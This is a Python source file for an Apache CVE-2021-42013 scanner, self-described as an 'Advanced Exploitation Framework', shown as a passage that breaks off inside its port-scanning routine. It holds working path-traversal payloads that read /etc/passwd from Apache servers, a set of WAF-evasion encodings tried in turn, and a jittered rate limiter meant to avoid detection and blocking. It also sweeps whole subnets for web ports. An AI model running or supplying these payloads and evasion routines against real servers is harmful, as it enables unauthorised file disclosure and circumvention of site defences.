#!/usr/bin/env python3
"""
Advanced Apache CVE-2021-42013 Vulnerability Scanner
Optimized for Windows WSL Environment
Professional scanner with version detection, WAF bypass, and config analysis
"""

import socket
import threading
import requests
import urllib3
import sys
import time
import re
import random
import json
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore, Style, Back, Cursor
import ipaddress
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import ssl
import warnings
import platform
import ctypes
import shutil

# WSL-specific imports
try:
    import win32api  # For Windows integration (optional)
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama for Windows with proper settings
init(autoreset=True, convert=True, strip=False)

class CyberSecurityLogo:
    """Professional cybersecurity logo with animations"""
    
    @staticmethod
    def get_terminal_size():
        """Get terminal width for centering"""
        try:
            return shutil.get_terminal_size().columns
        except:
            return 80
    
    @staticmethod
    def clear_screen():
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def print_centered(text, color=Fore.WHITE):
        """Print centered text"""
        terminal_width = CyberSecurityLogo.get_terminal_size()
        print(color + text.center(terminal_width) + Style.RESET_ALL)
    
    @staticmethod
    def print_ascii_logo():
        """Print main ASCII logo"""
        logo = f"""
{Fore.RED}    ╔═══════════════════════════════════════════════════════════════════╗
{Fore.RED}    ║{Fore.YELLOW}  ██████╗  ██████╗  ██████╗ ███████╗ {Fore.CYAN}██████╗ ██╗   ██╗███████╗██████╗ {Fore.RED}║
{Fore.RED}    ║{Fore.YELLOW}  ██╔══██╗██╔═══██╗██╔═══██╗██╔════╝ {Fore.CYAN}██╔══██╗██║   ██║██╔════╝██╔══██╗{Fore.RED}║
{Fore.RED}    ║{Fore.YELLOW}  ██████╔╝██║   ██║██║   ██║███████╗ {Fore.CYAN}██████╔╝██║   ██║█████╗  ██████╔╝{Fore.RED}║
{Fore.RED}    ║{Fore.YELLOW}  ██╔══██╗██║   ██║██║   ██║╚════██║ {Fore.CYAN}██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗{Fore.RED}║
{Fore.RED}    ║{Fore.YELLOW}  ██████╔╝╚██████╔╝╚██████╔╝███████║ {Fore.CYAN}██████╔╝ ╚████╔╝ ███████╗██║  ██║{Fore.RED}║
{Fore.RED}    ║{Fore.YELLOW}  ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝ {Fore.CYAN}╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝{Fore.RED}║
{Fore.RED}    ╚═══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(logo)
    
    @staticmethod
    def print_cyber_shield():
        """Print cyber shield decoration"""
        shield = f"""
{Fore.CYAN}                            ╔══════════════════════╗
{Fore.CYAN}                            ║{Fore.RED}  🔒  CYBER SHIELD  🔒  {Fore.CYAN}║
{Fore.CYAN}                            ╚══════════════════════╝{Style.RESET_ALL}
"""
        print(shield)
    
    @staticmethod
    def print_banner():
        """Print complete professional banner"""
        CyberSecurityLogo.clear_screen()
        
        # Top border with matrix effect
        terminal_width = CyberSecurityLogo.get_terminal_size()
        print(Fore.GREEN + "┌" + "─" * (terminal_width - 2) + "┐" + Style.RESET_ALL)
        
        # Empty line with side borders
        print(Fore.GREEN + "│" + " " * (terminal_width - 2) + "│" + Style.RESET_ALL)
        
        # Main logo with centering
        logo_lines = [
            f"{Fore.RED}███╗   ███╗███████╗██████╗  █████╗ ███████╗████████╗███████╗",
            f"{Fore.RED}████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝",
            f"{Fore.YELLOW}██╔████╔██║█████╗  ██████╔╝███████║███████╗   ██║   █████╗  ",
            f"{Fore.YELLOW}██║╚██╔╝██║██╔══╝  ██╔══██╗██╔══██║╚════██║   ██║   ██╔══╝  ",
            f"{Fore.GREEN}██║ ╚═╝ ██║███████╗██║  ██║██║  ██║███████║   ██║   ███████╗",
            f"{Fore.GREEN}╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝{Style.RESET_ALL}"
        ]
        
        for line in logo_lines:
            CyberSecurityLogo.print_centered(line)
        
        # Empty line
        print(Fore.GREEN + "│" + " " * (terminal_width - 2) + "│" + Style.RESET_ALL)
        
        # Title with glitch effect
        title = f"{Fore.RED}⚡{Fore.YELLOW}═══════════════════════════════════════════════════════════════{Fore.RED}⚡"
        CyberSecurityLogo.print_centered(title)
        
        # Professional info with colors
        info_lines = [
            f"{Fore.CYAN}🔹 {Fore.WHITE}Apache CVE-2021-42013 Advanced Vulnerability Scanner{Fore.CYAN} 🔹",
            f"{Fore.YELLOW}   ⚔️  Professional Edition  ⚔️{Style.RESET_ALL}",
            f"{Fore.GREEN}   👑 Developed by: {Fore.RED}BOOS{Fore.YELLOW} [Cyber Security Expert]{Fore.GREEN} 👑{Style.RESET_ALL}",
            f"{Fore.MAGENTA}   🛡️  Advanced Exploitation Framework  🛡️{Style.RESET_ALL}"
        ]
        
        for line in info_lines:
            CyberSecurityLogo.print_centered(line)
        
        # Bottom border
        print(Fore.GREEN + "│" + " " * (terminal_width - 2) + "│" + Style.RESET_ALL)
        print(Fore.GREEN + "└" + "─" * (terminal_width - 2) + "┘" + Style.RESET_ALL)
        
        # Matrix-like loading effect
        print()
        CyberSecurityLogo.print_loading_effect()
    
    @staticmethod
    def print_loading_effect():
        """Print loading animation"""
        loading_texts = [
            f"{Fore.GREEN}[✓] {Fore.WHITE}Initializing Cyber Exploitation Framework...{Style.RESET_ALL}",
            f"{Fore.YELLOW}[*] {Fore.WHITE}Loading advanced payload modules...{Style.RESET_ALL}",
            f"{Fore.CYAN}[*] {Fore.WHITE}Configuring WAF bypass techniques...{Style.RESET_ALL}",
            f"{Fore.MAGENTA}[✓] {Fore.WHITE}System ready for deployment!{Style.RESET_ALL}"
        ]
        
        for text in loading_texts:
            CyberSecurityLogo.print_centered(text)
            time.sleep(0.3)
    
    @staticmethod
    def print_scan_start(target):
        """Print scan start banner"""
        terminal_width = CyberSecurityLogo.get_terminal_size()
        print()
        print(Fore.CYAN + "┌" + "─" * (terminal_width - 2) + "┐" + Style.RESET_ALL)
        CyberSecurityLogo.print_centered(f"{Fore.RED}🎯 TARGET ACQUIRED 🎯{Style.RESET_ALL}")
        CyberSecurityLogo.print_centered(f"{Fore.YELLOW}⚡ {target} ⚡{Style.RESET_ALL}")
        print(Fore.CYAN + "├" + "─" * (terminal_width - 2) + "┤" + Style.RESET_ALL)
    
    @staticmethod
    def print_result_box(title, content, color=Fore.GREEN):
        """Print result in a box"""
        terminal_width = CyberSecurityLogo.get_terminal_size()
        print(color + "┌" + "─" * (terminal_width - 2) + "┐" + Style.RESET_ALL)
        CyberSecurityLogo.print_centered(f"{color}📌 {title} 📌{Style.RESET_ALL}")
        print(color + "├" + "─" * (terminal_width - 2) + "┤" + Style.RESET_ALL)
        
        # Split content into lines and center each
        if isinstance(content, list):
            for line in content:
                CyberSecurityLogo.print_centered(f"{color}{line}{Style.RESET_ALL}")
        else:
            CyberSecurityLogo.print_centered(f"{color}{content}{Style.RESET_ALL}")
        
        print(color + "└" + "─" * (terminal_width - 2) + "┘" + Style.RESET_ALL)
    
    @staticmethod
    def print_vulnerable_found(url, confidence, version):
        """Print vulnerable server found with style"""
        terminal_width = CyberSecurityLogo.get_terminal_size()
        print()
        print(Fore.RED + "╔" + "═" * (terminal_width - 2) + "╗" + Style.RESET_ALL)
        print(Fore.RED + "║" + " " * (terminal_width - 2) + "║" + Style.RESET_ALL)
        
        # Center the warning
        warning = f"{Fore.RED}⚠️  CRITICAL VULNERABILITY DETECTED  ⚠️{Style.RESET_ALL}"
        print(Fore.RED + "║" + warning.center(terminal_width - 2) + "║" + Style.RESET_ALL)
        
        print(Fore.RED + "║" + " " * (terminal_width - 2) + "║" + Style.RESET_ALL)
        print(Fore.RED + "╠" + "═" * (terminal_width - 2) + "╣" + Style.RESET_ALL)
        
        # Target info
        target_line = f"{Fore.YELLOW}📍 Target: {Fore.WHITE}{url}{Style.RESET_ALL}"
        print(Fore.RED + "║" + target_line.center(terminal_width - 2) + "║" + Style.RESET_ALL)
        
        confidence_line = f"{Fore.YELLOW}📊 Confidence: {Fore.WHITE}{confidence}%{Style.RESET_ALL}"
        print(Fore.RED + "║" + confidence_line.center(terminal_width - 2) + "║" + Style.RESET_ALL)
        
        version_line = f"{Fore.YELLOW}🔧 Apache Version: {Fore.WHITE}{version}{Style.RESET_ALL}"
        print(Fore.RED + "║" + version_line.center(terminal_width - 2) + "║" + Style.RESET_ALL)
        
        print(Fore.RED + "║" + " " * (terminal_width - 2) + "║" + Style.RESET_ALL)
        print(Fore.RED + "╚" + "═" * (terminal_width - 2) + "╝" + Style.RESET_ALL)
    
    @staticmethod
    def print_exploit_success(technique, payload, evidence):
        """Print successful exploit details"""
        print(f"{Fore.GREEN}╭────────────────────────────────────────────────────────────────╮{Style.RESET_ALL}")
        print(f"{Fore.GREEN}│{Fore.RED}    ✅ EXPLOIT SUCCESSFUL - Technique: {technique:<20} {Fore.GREEN}│{Style.RESET_ALL}")
        print(f"{Fore.GREEN}├────────────────────────────────────────────────────────────────┤{Style.RESET_ALL}")
        print(f"{Fore.GREEN}│{Fore.YELLOW}    Payload: {Fore.CYAN}{payload:<55} {Fore.GREEN}│{Style.RESET_ALL}")
        print(f"{Fore.GREEN}│{Fore.YELLOW}    Evidence: {Fore.WHITE}{evidence:<53} {Fore.GREEN}│{Style.RESET_ALL}")
        print(f"{Fore.GREEN}╰────────────────────────────────────────────────────────────────╯{Style.RESET_ALL}")

class WSLEnvironment:
    """Handle WSL-specific environment settings"""
    
    @staticmethod
    def check_wsl():
        """Check if running in WSL"""
        try:
            with open('/proc/version', 'r') as f:
                version = f.read().lower()
                return 'microsoft' in version or 'wsl' in version
        except:
            return False
    
    @staticmethod
    def get_wsl_version():
        """Get WSL version (1 or 2)"""
        try:
            result = subprocess.run(['wsl.exe', '--status'], 
                                  capture_output=True, text=True, shell=True)
            if 'WSL 2' in result.stdout:
                return 2
            elif 'WSL 1' in result.stdout:
                return 1
            return None
        except:
            return None
    
    @staticmethod
    def get_windows_ip():
        """Get Windows host IP from WSL"""
        try:
            # Method 1: Get from resolv.conf
            with open('/etc/resolv.conf', 'r') as f:
                for line in f:
                    if 'nameserver' in line:
                        return line.split()[1]
        except:
            pass
        
        try:
            # Method 2: Use ip route
            result = subprocess.run(['ip', 'route'], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    return line.split()[2]
        except:
            pass
        
        return '172.17.0.1'  # Default WSL2 gateway

class WSLNetworkScanner:
    """Network scanning optimized for WSL"""
    
    def __init__(self):
        self.wsl_env = WSLEnvironment()
        self.windows_ip = self.wsl_env.get_windows_ip()
        
    def get_local_network(self):
        """Get local network information in WSL"""
        network_info = {
            'wsl_ip': None,
            'windows_ip': self.windows_ip,
            'wsl_interface': None,
            'available_interfaces': []
        }
        
        try:
            # Get WSL IP
            result = subprocess.run(['hostname', '-I'], 
                                  capture_output=True, text=True)
            if result.stdout:
                network_info['wsl_ip'] = result.stdout.strip().split()[0]
            
            # Get network interfaces
            result = subprocess.run(['ip', 'addr', 'show'], 
                                  capture_output=True, text=True)
            network_info['available_interfaces'] = result.stdout
            
        except Exception as e:
            pass
        
        return network_info
    
    def scan_windows_hosts(self):
        """Scan for Windows hosts accessible from WSL"""
        hosts = []
        
        # Common Windows host IPs in WSL
        possible_hosts = [
            self.windows_ip,  # Windows host
            '127.0.0.1',      # localhost
            'localhost',       # hostname
        ]
        
        # Add common subnet ranges
        if self.windows_ip:
            base_ip = '.'.join(self.windows_ip.split('.')[:-1])
            for i in range(1, 255):
                possible_hosts.append(f"{base_ip}.{i}")
        
        return list(set(possible_hosts))  # Remove duplicates

class ApacheVersionDetector:
    """Detect Apache version from server responses"""
    
    @staticmethod
    def extract_version(headers):
        """Extract Apache version from Server header"""
        version_info = {
            'version': None,
            'full_string': None,
            'vulnerable_range': False,
            'os_info': None,
            'modules': []
        }
        
        server_header = headers.get('Server', '')
        if not server_header:
            return version_info
        
        version_info['full_string'] = server_header
        
        # Extract Apache version
        apache_match = re.search(r'Apache/(\d+\.\d+\.\d+)', server_header, re.IGNORECASE)
        if apache_match:
            version_info['version'] = apache_match.group(1)
            
            # Check if version is in vulnerable range (2.4.49 or 2.4.50)
            if version_info['version'] in ['2.4.49', '2.4.50']:
                version_info['vulnerable_range'] = True
        
        # Extract OS info
        os_match = re.search(r'\((.*?)\)', server_header)
        if os_match:
            version_info['os_info'] = os_match.group(1)
        
        # Extract modules
        modules = re.findall(r'(\w+)/(\d+\.\d+(?:\.\d+)?)', server_header)
        for module, mod_version in modules:
            if module.lower() != 'apache':
                version_info['modules'].append({'name': module, 'version': mod_version})
        
        return version_info

class ApacheConfigChecker:
    """Check Apache configuration for vulnerable settings"""
    
    def __init__(self, base_url, session):
        self.base_url = base_url.rstrip('/')
        self.session = session
        self.findings = []
    
    def check_cgi_enabled(self):
        """Check if CGI is enabled"""
        test_paths = [
            '/cgi-bin/test.cgi',
            '/cgi-bin/printenv',
            '/cgi-bin/printenv.pl',
            '/cgi-bin/php',
            '/cgi-bin/php-cgi',
            '/cgi-bin/hello',
            '/cgi-bin/test',
        ]
        
        for path in test_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=5, verify=False)
                
                if response.status_code != 404:
                    self.findings.append({
                        'type': 'cgi_enabled',
                        'path': path,
                        'status': response.status_code,
                        'details': 'CGI script directory is accessible'
                    })
                    return True
            except:
                continue
        
        return False
    
    def check_require_all(self):
        """Check for 'Require all granted' misconfiguration"""
        traversal_payloads = [
            '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/cgi-bin/.%252e/.%252e/.%252e/.%252e/etc/passwd',
            '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/manual/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        ]
        
        for payload in traversal_payloads:
            try:
                url = f"{self.base_url}{payload}"
                response = self.session.get(url, timeout=5, verify=False)
                
                if response.status_code == 200:
                    # Check if we got system file content
                    if 'root:x:0:0:' in response.text or 'daemon:x:1:1:' in response.text:
                        self.findings.append({
                            'type': 'require_all_granted',
                            'payload': payload,
                            'details': 'Server allows path traversal - "Require all granted" likely present',
                            'severity': 'CRITICAL'
                        })
                        return True
                elif response.status_code == 403:
                    self.findings.append({
                        'type': 'require_all_denied',
                        'details': 'Access forbidden - proper restrictions in place',
                        'severity': 'INFO'
                    })
            except:
                continue
        
        return False

class WAFDetector:
    """Detect Web Application Firewall presence and rules"""
    
    def __init__(self, session):
        self.session = session
        self.waf_signatures = {
            'cloudflare': ['cloudflare', '__cfduid', 'cf-ray'],
            'aws_waf': ['awselb', 'x-amz-cf-id', 'x-amz-cf-pop'],
            'mod_security': ['mod_security', 'modsecurity', 'no cache'],
            'sucuri': ['sucuri', 'x-sucuri-id', 'sucuri/'],
            'imperva': ['incapsula', 'x-iinfo', '__cfduid'],
            'f5_bigip': ['bigip', 'f5', 'x-wa-info'],
            'fortinet': ['fortigate', 'fortiweb'],
        }
        
        self.blocked_patterns = [
            '403 forbidden',
            'blocked',
            'waf',
            'firewall',
            'rejected',
            'malicious',
            'suspicious',
        ]
    
    def detect(self, url):
        """Detect WAF presence"""
        waf_info = {
            'present': False,
            'name': None,
            'rules_detected': [],
            'bypass_possible': False,
            'evasion_methods': []
        }
        
        # Method 1: Check headers
        try:
            response = self.session.get(url, timeout=5, verify=False)
            
            # Check response headers for WAF signatures
            headers_str = str(response.headers).lower()
            for waf_name, signatures in self.waf_signatures.items():
                for sig in signatures:
                    if sig in headers_str:
                        waf_info['present'] = True
                        waf_info['name'] = waf_name
                        waf_info['rules_detected'].append(f"Header signature: {sig}")
                        
        except Exception as e:
            pass
        
        # Method 2: Test with malicious payload
        try:
            test_payload = "../../../../etc/passwd"
            test_url = f"{url}/cgi-bin/php?file={test_payload}"
            response = self.session.get(test_url, timeout=5, verify=False)
            
            # Check for blocking
            content = response.text.lower()
            for pattern in self.blocked_patterns:
                if pattern in content:
                    waf_info['present'] = True
                    waf_info['rules_detected'].append(f"Block pattern: {pattern}")
                    
        except Exception as e:
            if '403' in str(e) or 'block' in str(e):
                waf_info['present'] = True
                waf_info['rules_detected'].append("Connection blocked - possible WAF")
        
        # Determine evasion possibilities
        if waf_info['present']:
            waf_info['bypass_possible'] = True
            waf_info['evasion_methods'] = [
                'Encoding variations (URL encode, double encode)',
                'Path normalization tricks',
                'Case manipulation',
                'Parameter pollution',
                'Using different HTTP methods',
                'Adding junk parameters',
                'Using Unicode normalization',
            ]
        
        return waf_info

class RateLimiter:
    """Smart rate limiting to avoid detection and blocking"""
    
    def __init__(self, min_delay=0.5, max_delay=3.0, jitter=True):
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.jitter = jitter
        self.request_times = []
        self.blocks_detected = 0
    
    def wait(self):
        """Wait appropriate time before next request"""
        if self.request_times:
            elapsed = time.time() - self.request_times[-1]
            
            # Adjust delay based on blocks detected
            if self.blocks_detected > 3:
                base_delay = self.max_delay
            else:
                base_delay = self.min_delay
            
            if elapsed < base_delay:
                wait_time = base_delay - elapsed
                
                # Add jitter to avoid pattern detection
                if self.jitter:
                    wait_time += random.uniform(0.1, 1.0)
                
                time.sleep(wait_time)
        
        self.request_times.append(time.time())
        # Keep only last 100 request times
        if len(self.request_times) > 100:
            self.request_times = self.request_times[-100:]
    
    def block_detected(self):
        """Record a detected block and adjust rate"""
        self.blocks_detected += 1
        if self.blocks_detected > 5:
            self.min_delay *= 1.5
            self.max_delay *= 1.5

class AdvancedApacheScanner:
    """Advanced Apache vulnerability scanner with comprehensive checks"""
    
    def __init__(self):
        self.vulnerable_servers = []
        self.open_ports = []
        self.timeout = 10
        self.threads = 50
        self.session = self._create_session()
        self.rate_limiter = RateLimiter()
        self.wsl_env = WSLEnvironment()
        self.wsl_scanner = WSLNetworkScanner()
        self.logo = CyberSecurityLogo()
        
        # Check if running in WSL
        self.in_wsl = self.wsl_env.check_wsl()
        
        # Expanded port list with service detection
        self.port_services = {
            80: 'http',
            443: 'https',
            8080: 'http',
            8443: 'https',
            9443: 'https',
            8000: 'http',
            8081: 'http',
            8888: 'http',
            9090: 'http',
            7443: 'https',
            10443: 'https',
            2082: 'http',  # cPanel
            2083: 'https', # cPanel SSL
            2086: 'http',  # WHM
            2087: 'https', # WHM SSL
            2095: 'http',  # cPanel webmail
            2096: 'https', # cPanel webmail SSL
            8082: 'https', # Usually HTTPS alternative
        }
    
    def _create_session(self):
        """Create requests session with retry strategy"""
        session = requests.Session()
        
        # Configure retries
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=20,
            pool_maxsize=20
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        return session
    
    def detect_service(self, ip, port):
        """Detect service running on port"""
        try:
            # Try HTTPS first for standard SSL ports
            if port in [443, 8443, 9443, 2083, 2087, 2096, 7443, 10443]:
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    with socket.create_connection((ip, port), timeout=5) as sock:
                        with context.wrap_socket(sock, server_hostname=ip) as ssock:
                            cert = ssock.getpeercert()
                            if cert:
                                return 'https'
                except:
                    pass
            
            # Try HTTP
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, port))
                
                # Send HTTP request
                request = f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                sock.send(request.encode())
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                
                if 'HTTP/' in response:
                    if 'Server:' in response:
                        server_line = re.search(r'Server: (.*?)\r\n', response, re.IGNORECASE)
                        if server_line and 'apache' in server_line.group(1).lower():
                            return 'apache'
                    return 'http'
                
                sock.close()
            except:
                pass
            
            # Default based on port
            return self.port_services.get(port, 'unknown')
            
        except Exception as e:
            return 'unknown'
    
    def advanced_version_check(self, url):
        """Multi-stage version verification"""
        version_check = {
            'method_used': None,
            'confidence': 0,
            'version': None,
            'evidence': []
        }
        
        # Stage 1: Check Server header
        try:
            response = self.session.get(url, timeout=5, verify=False)
            server = response.headers.get('Server', '')
            if server:
                version_check['method_used'] = 'server_header'
                version_check['evidence'].append(f"Server header: {server}")
                
                apache_ver = re.search(r'Apache/(\d+\.\d+\.\d+)', server, re.IGNORECASE)
                if apache_ver:
                    version_check['version'] = apache_ver.group(1)
                    version_check['confidence'] = 80
        except:
            pass
        
        # Stage 2: Check error pages
        if version_check['confidence'] < 80:
            try:
                # Trigger 404 error
                response = self.session.get(f"{url}/nonexistent_page_{random.randint(1000,9999)}.html", 
                                           timeout=5, verify=False)
                
                if 'Apache' in response.text or 'apache' in response.text.lower():
                    version_check['method_used'] = 'error_page'
                    version_check['evidence'].append("Apache signature found in error page")
                    
                    # Try to extract version from error page
                    ver_match = re.search(r'Apache(?:/| )(\d+\.\d+\.\d+)', response.text, re.IGNORECASE)
                    if ver_match:
                        version_check['version'] = ver_match.group(1)
                        version_check['confidence'] = 60
                    else:
                        version_check['confidence'] = 40
            except:
                pass
        
        # Stage 3: Check for Apache-specific files
        if version_check['confidence'] < 60:
            apache_files = [
                '/manual/', '/icons/', '/apache_pb.png', '/error/HTTP_BAD_REQUEST.html.var'
            ]
            
            for file_path in apache_files:
                try:
                    response = self.session.get(f"{url}{file_path}", timeout=5, verify=False)
                    if response.status_code == 200:
                        if 'Apache' in response.text:
                            version_check['method_used'] = 'apache_files'
                            version_check['evidence'].append(f"Apache file found: {file_path}")
                            version_check['confidence'] = 30
                            break
                except:
                    continue
        
        return version_check
    
    def test_payload_with_evasion(self, url, base_payload):
        """Test payload with various evasion techniques"""
        evasion_results = []
        
        evasion_techniques = [
            {'name': 'Standard', 'payload': base_payload},
            {'name': 'Double URL encode', 'payload': base_payload.replace('.', '%252e')},
            {'name': 'Mixed case', 'payload': base_payload.upper()},
            {'name': 'Path normalization', 'payload': base_payload.replace('/cgi-bin/', '/cgi-bin/./')},
            {'name': 'Parameter pollution', 'payload': f"{base_payload}?a=1&a=2&a=3"},
            {'name': 'Unicode variation', 'payload': base_payload.replace('.', '\u002e')},
            {'name': 'Add junk parameter', 'payload': f"{base_payload}?junk={random.randint(1000,9999)}"},
        ]
        
        for technique in evasion_techniques:
            try:
                test_url = f"{url}{technique['payload']}"
                
                # Apply rate limiting
                self.rate_limiter.wait()
                
                response = self.session.get(test_url, timeout=8, verify=False)
                
                if response.status_code == 200:
                    # Check for actual system file content
                    if 'root:x:0:0:' in response.text or 'daemon:x:1:1:' in response.text:
                        evasion_results.append({
                            'technique': technique['name'],
                            'payload': technique['payload'],
                            'success': True,
                            'confidence': 100,
                            'evidence': 'System file content detected'
                        })
                    elif 'bin/bash' in response.text or 'bin/sh' in response.text:
                        evasion_results.append({
                            'technique': technique['name'],
                            'payload': technique['payload'],
                            'success': True,
                            'confidence': 90,
                            'evidence': 'File content detected'
                        })
                    else:
                        evasion_results.append({
                            'technique': technique['name'],
                            'payload': technique['payload'],
                            'success': False,
                            'status_code': response.status_code,
                            'note': 'Response but no system file'
                        })
                elif response.status_code == 403:
                    # Possible WAF block
                    self.rate_limiter.block_detected()
                    evasion_results.append({
                        'technique': technique['name'],
                        'payload': technique['payload'],
                        'success': False,
                        'status_code': 403,
                        'note': 'Access forbidden - possible WAF'
                    })
                else:
                    evasion_results.append({
                        'technique': technique['name'],
                        'payload': technique['payload'],
                        'success': False,
                        'status_code': response.status_code,
                        'note': f"HTTP {response.status_code}"
                    })
                    
            except requests.exceptions.Timeout:
                evasion_results.append({
                    'technique': technique['name'],
                    'payload': technique['payload'],
                    'success': False,
                    'error': 'Timeout'
                })
            except Exception as e:
                evasion_results.append({
                    'technique': technique['name'],
                    'payload': technique['payload'],
                    'success': False,
                    'error': str(e)[:50]
                })
        
        return evasion_results
    
    def comprehensive_vuln_check(self, target, port):
        """Comprehensive vulnerability check with false positive elimination"""
        protocol = "https" if port in [443, 8443, 9443, 2083, 2087, 7443, 10443] else "http"
        base_url = f"{protocol}://{target}:{port}"
        
        print(f"\n{Fore.CYAN}┌────────────────────────────────────────────────────────────────┐{Style.RESET_ALL}")
        print(f"{Fore.CYAN}│{Fore.YELLOW}    🔍 Comprehensive Vulnerability Check for: {base_url:<35} {Fore.CYAN}│{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}")
        
        result = {
            'url': base_url,
            'port': port,
            'vulnerable': False,
            'confidence': 0,
            'version_info': {},
            'config_analysis': [],
            'waf_info': {},
            'evasion_results': [],
            'false_positive_risk': 'HIGH',
            'evidence': []
        }
        
        # Step 1: Advanced version check
        print(f"{Fore.YELLOW}    [*] Checking Apache version...{Style.RESET_ALL}")
        version_info = self.advanced_version_check(base_url)
        result['version_info'] = version_info
        
        if version_info.get('version'):
            print(f"{Fore.GREEN}    [+] Detected Apache version: {version_info['version']}{Style.RESET_ALL}")
            
            if version_info['version'] in ['2.4.49', '2.4.50']:
                print(f"{Fore.RED}    [!] Version is in vulnerable range{Style.RESET_ALL}")
                result['false_positive_risk'] = 'LOW'
            else:
                print(f"{Fore.YELLOW}    [-] Version not in vulnerable range{Style.RESET_ALL}")
                result['false_positive_risk'] = 'MEDIUM'
        
        # Step 2: WAF detection
        print(f"{Fore.YELLOW}    [*] Detecting WAF...{Style.RESET_ALL}")
        waf_detector = WAFDetector(self.session)
        waf_info = waf_detector.detect(base_url)
        result['waf_info'] = waf_info
        
        if waf_info['present']:
            print(f"{Fore.RED}    [!] WAF detected: {waf_info['name'] or 'Unknown'}{Style.RESET_ALL}")
            if waf_info['bypass_possible']:
                print(f"{Fore.YELLOW}    [*] Bypass techniques available{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}    [+] No WAF detected{Style.RESET_ALL}")
        
        # Step 3: Configuration analysis
        print(f"{Fore.YELLOW}    [*] Analyzing Apache configuration...{Style.RESET_ALL}")
        config_checker = ApacheConfigChecker(base_url, self.session)
        
        cgi_enabled = config_checker.check_cgi_enabled()
        if cgi_enabled:
            print(f"{Fore.GREEN}    [+] CGI enabled - potential attack vector{Style.RESET_ALL}")
            result['config_analysis'].append({'finding': 'CGI enabled', 'risk': 'HIGH'})
        
        require_all = config_checker.check_require_all()
        if require_all:
            print(f"{Fore.RED}    [!] 'Require all granted' likely present{Style.RESET_ALL}")
            result['config_analysis'].append({'finding': 'Require all granted', 'risk': 'CRITICAL'})
        
        result['config_analysis'].extend(config_checker.findings)
        
        # Step 4: Test with multiple payloads and evasion
        print(f"{Fore.YELLOW}    [*] Testing with evasion techniques...{Style.RESET_ALL}")
        
        base_payloads = [
            '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd',
        ]
        
        all_evasion_results = []
        for base_payload in base_payloads:
            evasion_results = self.test_payload_with_evasion(base_url, base_payload)
            all_evasion_results.extend(evasion_results)
            
            # Check if any evasion was successful
            for ev_result in evasion_results:
                if ev_result.get('success'):
                    result['vulnerable'] = True
                    result['confidence'] = max(result['confidence'], ev_result.get('confidence', 0))
                    result['evidence'].append({
                        'type': 'successful_exploit',
                        'technique': ev_result['technique'],
                        'payload': ev_result['payload'],
                        'evidence': ev_result.get('evidence', '')
                    })
        
        result['evasion_results'] = all_evasion_results
        
        # Step 5: Determine final vulnerability status
        if result['vulnerable']:
            self.logo.print_vulnerable_found(base_url, result['confidence'], version_info.get('version', 'Unknown'))
            
            # Show successful techniques
            for evidence in result['evidence']:
                if evidence['type'] == 'successful_exploit':
                    self.logo.print_exploit_success(evidence['technique'], evidence['payload'], evidence['evidence'])
        elif result['confidence'] > 50:
            print(f"{Fore.YELLOW}    [?] Possibly vulnerable - needs manual verification{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}    [-] Not vulnerable (or well protected){Style.RESET_ALL}")
        
        return result
    
    def scan_target(self, target):
        """Main scanning function optimized for WSL"""
        self.logo.print_scan_start(target)
        
        # If target is 'localhost' or '127.0.0.1' in WSL, suggest Windows host
        if self.in_wsl and target in ['localhost', '127.0.0.1']:
            print(f"{Fore.YELLOW}    [!] In WSL, localhost points to WSL VM, not Windows{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    [!] To scan Windows host, use: {self.wsl_scanner.windows_ip}{Style.RESET_ALL}")
        
        # Detect open ports
        open_ports = []
        print(f"{Fore.CYAN}    [*] Scanning for open ports...{Style.RESET_ALL}")
        
        for port, service in self.port_services.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    service_type = self.detect_service(target, port)
                    print(f"{Fore.GREEN}    [+] Port {port} open - Service: {service_type}{Style.RESET_ALL}")
